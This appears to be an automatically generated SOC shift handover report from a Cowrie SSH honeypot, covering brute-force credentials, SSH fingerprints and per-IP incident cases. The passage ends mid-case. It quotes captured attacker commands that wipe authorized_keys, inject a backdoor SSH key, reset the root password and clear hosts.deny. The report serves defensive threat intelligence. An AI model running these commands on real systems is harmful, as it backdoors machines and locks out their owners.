# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T18:41:27Z |
| **Shift Time** | 18:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **155** |
| Confirmed Threats | **153** |
| False Positives Filtered | **2** (1.3%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **12** |
| High Severity Cases | **60** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **95** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **127** |
| Unique Credential Pairs | **69** |
| Unique Usernames | **33** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **37** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 60 |
| `345gs5662d34` | 31 |
| `ftpuser` | 3 |
| `ubuntu` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 31 |
| `3245gs5662d34` | 29 |
| `123456` | 3 |
| `123@123Abc` | 1 |
| `celeryuser` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 31 |
| `root` | `3245gs5662d34` | 29 |
| `root` | `123@123Abc` | 1 |
| `celeryuser` | `celeryuser` | 1 |
| `root` | `Abcd12..` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123@123Abc` | `1.30.199.218` | 2026-04-05T16:50:29 |
| `root` | `3245gs5662d34` | `1.30.199.218` | 2026-04-05T16:50:34 |
| `root` | `Abcd12..` | `112.184.119.22` | 2026-04-05T16:54:08 |
| `root` | `3245gs5662d34` | `112.184.119.22` | 2026-04-05T16:54:11 |
| `root` | `root2025@` | `112.184.119.22` | 2026-04-05T16:55:10 |
| `root` | `Abc@1234` | `103.213.238.91` | 2026-04-05T16:56:40 |
| `root` | `3245gs5662d34` | `103.213.238.91` | 2026-04-05T16:56:42 |
| `root` | `Password123!` | `112.184.119.22` | 2026-04-05T17:00:48 |
| `root` | `Login1` | `45.78.204.246` | 2026-04-05T17:07:03 |
| `root` | `3245gs5662d34` | `45.78.204.246` | 2026-04-05T17:07:05 |
| `root` | `P@ssw0rd@2026` | `112.184.119.22` | 2026-04-05T17:07:34 |
| `root` | `System1` | `112.184.119.22` | 2026-04-05T17:10:28 |
| `root` | `1qazXDR%` | `112.184.119.22` | 2026-04-05T17:12:31 |
| `root` | `Y4k1nm4suk.2026` | `49.49.231.154` | 2026-04-05T17:12:55 |
| `root` | `3245gs5662d34` | `49.49.231.154` | 2026-04-05T17:12:58 |
| `root` | `root11111@123` | `112.184.119.22` | 2026-04-05T17:13:29 |
| `root` | `1A2b3c4d` | `112.184.119.22` | 2026-04-05T17:14:28 |
| `root` | `Guest2024` | `49.49.231.154` | 2026-04-05T17:15:30 |
| `root` | `1122` | `49.49.231.154` | 2026-04-05T17:18:07 |
| `root` | `Mj123456` | `112.184.119.22` | 2026-04-05T17:18:22 |
| `root` | `4rfv@@` | `180.76.104.44` | 2026-04-05T17:33:02 |
| `root` | `Abcd12.` | `102.88.137.80` | 2026-04-05T17:34:52 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-04-05T17:34:59 |
| `root` | `Qazwsx12345@` | `102.88.137.80` | 2026-04-05T17:35:54 |
| `root` | `A123456I` | `102.88.137.80` | 2026-04-05T17:37:02 |
| `root` | `zxcZXC123!@#` | `181.49.8.57` | 2026-04-05T17:37:24 |
| `root` | `qazwsx123$` | `102.88.137.80` | 2026-04-05T17:38:07 |
| `root` | `CCbb112233` | `102.88.137.80` | 2026-04-05T17:41:11 |
| `root` | `ftpuser` | `102.88.137.80` | 2026-04-05T17:42:14 |
| `root` | `@B0g0r123` | `102.88.137.80` | 2026-04-05T17:46:29 |
| `root` | `zxcvbnm123!` | `102.88.137.80` | 2026-04-05T17:47:34 |
| `root` | `ubuntu1234` | `102.88.137.80` | 2026-04-05T17:49:41 |
| `root` | `!qwer1234` | `102.88.137.80` | 2026-04-05T17:50:48 |
| `root` | `A12345678B` | `102.88.137.80` | 2026-04-05T17:53:56 |
| `root` | `QWEasd@123` | `102.88.137.80` | 2026-04-05T17:58:12 |
| `root` | `123456789a@` | `102.88.137.80` | 2026-04-05T17:59:13 |
| `root` | `Qazwsx0000!@#` | `49.49.231.154` | 2026-04-05T18:11:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **155** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 149 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 91 | 10 |
| `713bd9cc9355...` | Mirai/variant | 51 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 91 | 10 | Modern SSH client |
| `713bd9cc9355...` | libssh | 51 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 1 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 29 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:6jcMo5KCbhCc"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `181.49.8.57`, `180.76.104.44`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.184.119.22`, `102.88.137.80`, `49.49.231.154`, `103.213.238.91`, `1.30.199.218`, `45.78.204.246`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 16 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (60)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-84d51c18e738

| Field | Detail |
|---|---|
| **Source IP** | `1.30.199[.]218` |
| **First Seen** | 2026-04-05 16:50 |
| **Last Seen** | 2026-04-05 16:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:50:28` | `cowrie.session.connect` |
| `2026-04-05 16:50:28` | `cowrie.client.version` |
| `2026-04-05 16:50:28` | `cowrie.client.kex` |
| `2026-04-05 16:50:29` | `cowrie.login.success` |
| `2026-04-05 16:50:29` | `cowrie.session.params` |
| `2026-04-05 16:50:29` | `cowrie.command.input` |
| `2026-04-05 16:50:29` | `cowrie.command.failed` |
| `2026-04-05 16:50:30` | `cowrie.log.closed` |
| `2026-04-05 16:50:30` | `cowrie.session.params` |
| `2026-04-05 16:50:30` | `cowrie.command.input` |
| `2026-04-05 16:50:30` | `cowrie.session.file_download` |
| `2026-04-05 16:50:30` | `cowrie.log.closed` |
| `2026-04-05 16:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.30.199[.]218` to AbuseIPDB if not already reported
- [ ] Block `1.30.199[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ec1deba675

| Field | Detail |
|---|---|
| **Source IP** | `1.30.199[.]218` |
| **First Seen** | 2026-04-05 16:50 |
| **Last Seen** | 2026-04-05 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:50:33` | `cowrie.session.connect` |
| `2026-04-05 16:50:33` | `cowrie.client.version` |
| `2026-04-05 16:50:33` | `cowrie.client.kex` |
| `2026-04-05 16:50:34` | `cowrie.login.success` |
| `2026-04-05 16:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.30.199[.]218` to AbuseIPDB if not already reported
- [ ] Block `1.30.199[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87674b1bae42

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 16:54 |
| **Last Seen** | 2026-04-05 16:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:54:07` | `cowrie.session.connect` |
| `2026-04-05 16:54:07` | `cowrie.client.version` |
| `2026-04-05 16:54:07` | `cowrie.client.kex` |
| `2026-04-05 16:54:08` | `cowrie.login.success` |
| `2026-04-05 16:54:08` | `cowrie.session.params` |
| `2026-04-05 16:54:08` | `cowrie.command.input` |
| `2026-04-05 16:54:08` | `cowrie.command.failed` |
| `2026-04-05 16:54:08` | `cowrie.log.closed` |
| `2026-04-05 16:54:08` | `cowrie.session.params` |
| `2026-04-05 16:54:08` | `cowrie.command.input` |
| `2026-04-05 16:54:08` | `cowrie.session.file_download` |
| `2026-04-05 16:54:08` | `cowrie.log.closed` |
| `2026-04-05 16:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91125efa4ab6

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 16:54 |
| **Last Seen** | 2026-04-05 16:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:54:11` | `cowrie.session.connect` |
| `2026-04-05 16:54:11` | `cowrie.client.version` |
| `2026-04-05 16:54:11` | `cowrie.client.kex` |
| `2026-04-05 16:54:11` | `cowrie.login.success` |
| `2026-04-05 16:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2b3d9ed260

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 16:55 |
| **Last Seen** | 2026-04-05 16:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:55:10` | `cowrie.session.connect` |
| `2026-04-05 16:55:10` | `cowrie.client.version` |
| `2026-04-05 16:55:10` | `cowrie.client.kex` |
| `2026-04-05 16:55:10` | `cowrie.login.success` |
| `2026-04-05 16:55:11` | `cowrie.session.params` |
| `2026-04-05 16:55:11` | `cowrie.command.input` |
| `2026-04-05 16:55:11` | `cowrie.command.failed` |
| `2026-04-05 16:55:11` | `cowrie.log.closed` |
| `2026-04-05 16:55:11` | `cowrie.session.params` |
| `2026-04-05 16:55:11` | `cowrie.command.input` |
| `2026-04-05 16:55:11` | `cowrie.session.file_download` |
| `2026-04-05 16:55:11` | `cowrie.log.closed` |
| `2026-04-05 16:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00b619753f4

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 16:55 |
| **Last Seen** | 2026-04-05 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:55:14` | `cowrie.session.connect` |
| `2026-04-05 16:55:14` | `cowrie.client.version` |
| `2026-04-05 16:55:14` | `cowrie.client.kex` |
| `2026-04-05 16:55:14` | `cowrie.login.success` |
| `2026-04-05 16:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c52b3d0190

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-04-05 16:56 |
| **Last Seen** | 2026-04-05 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:56:40` | `cowrie.session.connect` |
| `2026-04-05 16:56:40` | `cowrie.client.version` |
| `2026-04-05 16:56:40` | `cowrie.client.kex` |
| `2026-04-05 16:56:40` | `cowrie.login.success` |
| `2026-04-05 16:56:40` | `cowrie.session.params` |
| `2026-04-05 16:56:40` | `cowrie.command.input` |
| `2026-04-05 16:56:40` | `cowrie.command.failed` |
| `2026-04-05 16:56:40` | `cowrie.log.closed` |
| `2026-04-05 16:56:41` | `cowrie.session.params` |
| `2026-04-05 16:56:41` | `cowrie.command.input` |
| `2026-04-05 16:56:41` | `cowrie.session.file_download` |
| `2026-04-05 16:56:41` | `cowrie.log.closed` |
| `2026-04-05 16:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf9bc68acf8

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-04-05 16:56 |
| **Last Seen** | 2026-04-05 16:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 16:56:42` | `cowrie.session.connect` |
| `2026-04-05 16:56:42` | `cowrie.client.version` |
| `2026-04-05 16:56:42` | `cowrie.client.kex` |
| `2026-04-05 16:56:42` | `cowrie.login.success` |
| `2026-04-05 16:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61d295b9595

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:00 |
| **Last Seen** | 2026-04-05 17:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:00:48` | `cowrie.session.connect` |
| `2026-04-05 17:00:48` | `cowrie.client.version` |
| `2026-04-05 17:00:48` | `cowrie.client.kex` |
| `2026-04-05 17:00:48` | `cowrie.login.success` |
| `2026-04-05 17:00:49` | `cowrie.session.params` |
| `2026-04-05 17:00:49` | `cowrie.command.input` |
| `2026-04-05 17:00:49` | `cowrie.command.failed` |
| `2026-04-05 17:00:49` | `cowrie.log.closed` |
| `2026-04-05 17:00:49` | `cowrie.session.params` |
| `2026-04-05 17:00:49` | `cowrie.command.input` |
| `2026-04-05 17:00:49` | `cowrie.session.file_download` |
| `2026-04-05 17:00:49` | `cowrie.log.closed` |
| `2026-04-05 17:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a68406139c

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:00 |
| **Last Seen** | 2026-04-05 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:00:51` | `cowrie.session.connect` |
| `2026-04-05 17:00:51` | `cowrie.client.version` |
| `2026-04-05 17:00:51` | `cowrie.client.kex` |
| `2026-04-05 17:00:52` | `cowrie.login.success` |
| `2026-04-05 17:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94dc9c340095

| Field | Detail |
|---|---|
| **Source IP** | `45.78.204[.]246` |
| **First Seen** | 2026-04-05 17:07 |
| **Last Seen** | 2026-04-05 17:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:07:03` | `cowrie.session.connect` |
| `2026-04-05 17:07:03` | `cowrie.client.version` |
| `2026-04-05 17:07:03` | `cowrie.client.kex` |
| `2026-04-05 17:07:03` | `cowrie.login.success` |
| `2026-04-05 17:07:03` | `cowrie.session.params` |
| `2026-04-05 17:07:03` | `cowrie.command.input` |
| `2026-04-05 17:07:03` | `cowrie.command.failed` |
| `2026-04-05 17:07:03` | `cowrie.log.closed` |
| `2026-04-05 17:07:03` | `cowrie.session.params` |
| `2026-04-05 17:07:03` | `cowrie.command.input` |
| `2026-04-05 17:07:03` | `cowrie.session.file_download` |
| `2026-04-05 17:07:03` | `cowrie.log.closed` |
| `2026-04-05 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.204[.]246` to AbuseIPDB if not already reported
- [ ] Block `45.78.204[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc337df574a

| Field | Detail |
|---|---|
| **Source IP** | `45.78.204[.]246` |
| **First Seen** | 2026-04-05 17:07 |
| **Last Seen** | 2026-04-05 17:07 |
| **Session Duration** | 0s |
